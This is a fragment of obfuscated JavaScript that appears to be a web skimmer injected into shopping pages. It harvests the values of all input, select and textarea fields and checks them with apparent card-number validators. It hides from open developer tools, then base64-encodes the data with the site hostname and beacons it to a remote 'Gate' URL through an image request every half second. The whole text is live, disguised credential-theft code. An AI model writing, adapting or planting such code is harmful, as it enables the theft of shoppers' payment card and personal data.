_0x283de7;for(_0x91422d=0x0;_0x91422d<this['\x6c\x65\x6e\x67\x74\x68'];_0x91422d++){_0x105a8f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x91422d);_0x283de7=(_0x283de7<<0x5)-_0x283de7+_0x105a8f;_0x283de7|=0x0;}return _0x283de7;};var _0x510b36={};_0x510b36[_0x9a6d('0x12')]=_0x9a6d('0x13');_0x510b36[_0x9a6d('0x14')]={};_0x510b36[_0x9a6d('0x15')]=[];_0x510b36[_0x9a6d('0x16')]=![];_0x510b36[_0x9a6d('0x17')]=function(_0x5e1a54){if(_0x5e1a54.id!==undefined&&_0x5e1a54.id!=''&&_0x5e1a54.id!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.id]=_0x5e1a54.value;return;}if(_0x5e1a54.name!==undefined&&_0x5e1a54.name!=''&&_0x5e1a54.name!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.name]=_0x5e1a54.value;return;}};_0x510b36[_0x9a6d('0x18')]=function(){var _0x3f2f17=document.getElementsByTagName(_0x9a6d('0x19'));var _0x456620=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x519276=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x104ea6=0x0;_0x104ea6<_0x3f2f17.length;_0x104ea6++)_0x510b36.SaveParam(_0x3f2f17[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x456620.length;_0x104ea6++)_0x510b36.SaveParam(_0x456620[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x519276.length;_0x104ea6++)_0x510b36.SaveParam(_0x519276[_0x104ea6]);};_0x510b36[_0x9a6d('0x1a')]=function(){if(!window.devtools.isOpen&&_0x510b36.IsValid){_0x510b36.Data[_0x9a6d('0x1b')]=location.hostname;var _0x554fdf=encodeURIComponent(window.btoa(JSON.stringify(_0x510b36.Data)));var _0x399964=_0x554fdf.hashCode();for(var _0x401885=0x0;_0x401885<_0x510b36.Sent.length;_0x401885++)if(_0x510b36.Sent[_0x401885]==_0x399964)return;_0x510b36.LoadImage(_0x554fdf);}};_0x510b36[_0x9a6d('0x1c')]=function(){_0x510b36.SaveAllFields();_0x510b36.SendData();};_0x510b36['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x25da45){_0x510b36.Sent.push(_0x25da45.hashCode());var _0x37d4e5=document.createElement(_0x9a6d('0x1d'));_0x37d4e5.src=_0x510b36.GetImageUrl(_0x25da45);};_0x510b36[_0x9a6d('0x1e')]=function(_0xbc8d57){return _0x510b36.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbc8d57;};document[_0x9a6d('0x1f')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x9a6d('0x20')){window[_0x9a6d('0x21')](_0x510b36[_0x9a6d('0x1c')],0x1f4);}};